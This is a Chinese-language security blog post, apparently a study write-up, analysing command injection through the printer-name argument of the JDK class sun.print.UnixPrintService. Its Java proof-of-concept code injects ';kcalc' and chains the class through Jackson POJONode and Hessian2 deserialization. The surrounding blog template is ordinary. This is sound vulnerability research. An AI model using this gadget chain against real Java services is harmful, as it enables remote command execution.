@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      初探UnixPrintService 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">初探UnixPrintService</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-10-01 05:17:08
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为高贵的JDK自带getter，尽管他并没有继承Serializeable，但是仍可在hessian等依赖发挥作用。<br>该类在2022虎符CTF就已经被发现，但是网络上大部分的文章讲解都不是很细致，不过也确实没什么特别的，因为只在unix的JDK中存在，所以我就一直没有去细致了解，这几天搭建了Ubuntu的Java环境，就调一遍学习学习</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>配置linux的maven和java环境，要注意java的版本，在高版本UnixPrintService就被移除了</p>
+<h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p><a target="_blank" rel="noopener" href="https://maven.apache.org/download.cgi">Maven – Download Apache Maven</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37488998/article/details/111683904">Linux环境安装maven以及仓库和国内镜像的配置_linux换mavn国内源-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/java_18945106612/article/details/90301821">linux安装maven及配置环境变量_linux系统下maven怎么配置的？-CSDN博客</a></p>
+<h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><p><a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">Java 存档下载 — Java SE 8 | Oracle 中国</a><br><a target="_blank" rel="noopener" href="https://www.jetbrains.com/zh-cn/idea/download/?section=windows">下载 IntelliJ IDEA – 领先的 Java 和 Kotlin IDE (jetbrains.com)</a></p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>配置完环境后启动idea，还需要指定idea中的maven与jdk<br>UnixPrintService是反编译的，想要查看具体源码可以去下载源码包<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108288251-a77125ab-6e97-447b-b64d-5e0f59a256db.png#averageHue=%23665849&clientId=u90ff227c-5300-4&from=drop&id=u8a94f026&originHeight=662&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112621&status=done&style=none&taskId=ubd460b58-f0b3-4f2f-9aa5-a4e258337d2&title=" alt="Pasted image 20231001042751.png"></p>
+<p>这里我找了很久，就放出来帮助大家防止踩坑了<br><a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/ec41773b9ff2">jdk8u&#x2F;jdk8u&#x2F;jdk: ec41773b9ff2 (openjdk.org)</a>选择左边的下载方式即可<br>UnixPrintService源码在jdk-ec41773b9ff2\src\solaris\classes\sun目录中，在idea中添加源路径<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108295984-6429ddca-3813-408b-bcf4-99208d9f2d88.png#averageHue=%233b4149&clientId=u90ff227c-5300-4&from=drop&id=u69aceaaf&originHeight=331&originWidth=931&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35971&status=done&style=none&taskId=u5d5bc86b-822c-4be9-a755-3147ab7b331&title=" alt="Pasted image 20231001043120.png"><br>可以看见真实源码了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108304399-a92a05d1-f8e1-4e8e-bbb4-3a1c93d632d7.png#averageHue=%232c2c2b&clientId=u90ff227c-5300-4&from=drop&id=u1853e7aa&originHeight=698&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99603&status=done&style=none&taskId=u2c677aff-3ca9-434c-bee4-9e7d719105e&title=" alt="Pasted image 20231001043224.png"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108586953-f4fd77d3-61a1-4180-aa1a-7c8592ec3b38.png#averageHue=%232d2c2c&clientId=u90ff227c-5300-4&from=drop&id=u8e503cd6&originHeight=233&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32684&status=done&style=none&taskId=udb96a7e5-73fb-4535-a54a-b72840c113e&title=" alt="Pasted image 20231001043414.png"><br>该类的构造函数没有使用public与static修饰，所以只能通过使用反射去实例化该类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>print<span class="token punctuation">.</span></span><span class="token class-name">UnixPrintService</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> unix <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">Constructor</span> unixPrintServiceConstructor <span class="token operator">=</span> <span class="token class-name">UnixPrintService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        unixPrintServiceConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">UnixPrintService</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UnixPrintService</span><span class="token punctuation">)</span> unixPrintServiceConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">";kcalc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108330150-8706c4a0-8cf8-4e05-a664-d4cf441751c6.png#averageHue=%23879078&clientId=u90ff227c-5300-4&from=drop&id=u241aca08&originHeight=148&originWidth=527&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14166&status=done&style=none&taskId=u8b648fc5-5ff8-4363-9314-5b725595e25&title=" alt="Pasted image 20231001043836.png"></p>
+<p>我们知道该类中存在getter，所以我们关注一下get开头的函数，筛选一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108339017-92313c15-4f41-44c9-a7da-60854e89a3a4.png#averageHue=%232d2c2b&clientId=u90ff227c-5300-4&from=drop&id=u1e074e53&originHeight=552&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85032&status=done&style=none&taskId=u18243f24-b43d-4f7c-9004-e4a5073eed3&title=" alt="Pasted image 20231001043921.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108342882-46bf187a-8074-4b24-9971-072b25c330a3.png#averageHue=%232e2d2c&clientId=u90ff227c-5300-4&from=drop&id=ue0b78bd4&originHeight=699&originWidth=697&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103052&status=done&style=none&taskId=uf474af08-e66c-48dd-a85a-ed2fe160dae&title=" alt="Pasted image 20231001043938.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108346966-51fc3628-7504-4520-9e52-055a3ce12c9e.png#averageHue=%232d2c2c&clientId=u90ff227c-5300-4&from=drop&id=u33977829&originHeight=476&originWidth=606&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59185&status=done&style=none&taskId=uc8d4bebd-76ae-4234-b190-da4f48d4e49&title=" alt="Pasted image 20231001044004.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108353720-102f9df1-9375-46d7-b9d4-9aada452e66b.png#averageHue=%232e2d2c&clientId=u90ff227c-5300-4&from=drop&id=u6e11d411&originHeight=212&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26108&status=done&style=none&taskId=u541830a5-bbf0-4a17-a9b1-2716a2f8e99&title=" alt="Pasted image 20231001044024.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108356268-c5c29d9d-fbb4-4f95-bbc0-ec2e3ef8a6b2.png#averageHue=%232e2c2b&clientId=u90ff227c-5300-4&from=drop&id=ub6aa4e53&originHeight=744&originWidth=625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83780&status=done&style=none&taskId=udfc8424a-017e-4aea-a2cf-50faa4c2d43&title=" alt="Pasted image 20231001044042.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108358968-819a6b49-77ee-4e3d-9425-8eb77c4c877d.png#averageHue=%232d2c2b&clientId=u90ff227c-5300-4&from=drop&id=u4ccfe91d&originHeight=424&originWidth=657&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48354&status=done&style=none&taskId=u845a9617-5de9-40ad-8cec-0b1e69192b1&title=" alt="Pasted image 20231001044127.png"><br>可以看见都会将printer参数拼接进command中并调用PrintServiceLookupProvider进行执行，而printer是实例化时可控的参数，我们就可以通过控制该参数来造成命令注入</p>
+<p>我们来测试一下，注意这些函数都是私有函数，所以只能通过反射去调用</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>print<span class="token punctuation">.</span></span><span class="token class-name">UnixPrintService</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> unix <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">Constructor</span> unixPrintServiceConstructor <span class="token operator">=</span> <span class="token class-name">UnixPrintService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        unixPrintServiceConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">UnixPrintService</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UnixPrintService</span><span class="token punctuation">)</span> unixPrintServiceConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">";kcalc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token class-name">Method</span> getPrinterIsAcceptingJobsSysVS <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getPrinterIsAcceptingJobsSysV"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        getPrinterIsAcceptingJobsSysVS<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        getPrinterIsAcceptingJobsSysVS<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108377151-65842404-46b7-4cf1-862d-07e84decca8e.png#averageHue=%234b4a4a&clientId=u90ff227c-5300-4&from=drop&id=u4caab073&originHeight=470&originWidth=1338&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129110&status=done&style=none&taskId=ua2cf5122-b6ff-41d3-8575-a6bea42999e&title=" alt="Pasted image 20231001044546.png"></p>
+<h2 id="结合其他依赖的拓展"><a href="#结合其他依赖的拓展" class="headerlink" title="结合其他依赖的拓展"></a>结合其他依赖的拓展</h2><h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><p>在Hessian2的反序列化中，可以对没有继承序列化接口的类进行序列化和反序列化，并且还爆出过一个CVE漏洞，可以通过except去触发任意类的toString方法，这里可以我们可以去配合jackson的tostring链进行一个攻击，具体可以去看我之前写的hessian</p>
+<pre class="line-numbers language-none"><code class="language-none">Hessian2.readObject
+	POJONode.toString
+		UnixPrintService.getter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">POJONode</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">sec<span class="token punctuation">.</span>tools</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>print<span class="token punctuation">.</span></span><span class="token class-name">UnixPrintService</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> jackson_unix <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        tools<span class="token punctuation">.</span><span class="token function">overrideJackson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Constructor</span> unixPrintServiceConstructor <span class="token operator">=</span> <span class="token class-name">UnixPrintService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        unixPrintServiceConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">UnixPrintService</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UnixPrintService</span><span class="token punctuation">)</span> unixPrintServiceConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">";kcalc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">POJONode</span> jsonNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">tools<span class="token punctuation">.</span></span>Hessian2_toString_serialize</span><span class="token punctuation">(</span>jsonNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name"><span class="token namespace">tools<span class="token punctuation">.</span></span>Hessian2_Deserial</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696108390326-b24c3c03-98de-4000-9ca5-7022909b205b.png#averageHue=%236e5e4b&clientId=u90ff227c-5300-4&from=drop&id=u2e43ba59&originHeight=679&originWidth=859&originalType=binary&ratio=1&rotation=0&showTitle=false&size=136674&status=done&style=none&taskId=uad6a2fca-066b-4485-ad97-8957322b8f1&title=" alt="Pasted image 20231001045935.png"><br>注意：因为UnixPrintService中存在多个getter，所以会执行多次</p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>学习了一下发现，该类的利用面其实并不多？难怪很少有人写文章，本来还想和其他的依赖联动一下，发现除了hessian好像也没什么了，以后想起来再说吧</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/09/30/AspectJWeaver%E5%86%99%E6%96%87%E4%BB%B6%E5%8F%8A%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-10-01 05:17:08
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-text">准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#maven"><span class="toc-text">maven</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdk"><span class="toc-text">jdk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%85%B6%E4%BB%96%E4%BE%9D%E8%B5%96%E7%9A%84%E6%8B%93%E5%B1%95"><span class="toc-text">结合其他依赖的拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hessian"><span class="toc-text">Hessian</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE"><span class="toc-text">结尾</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
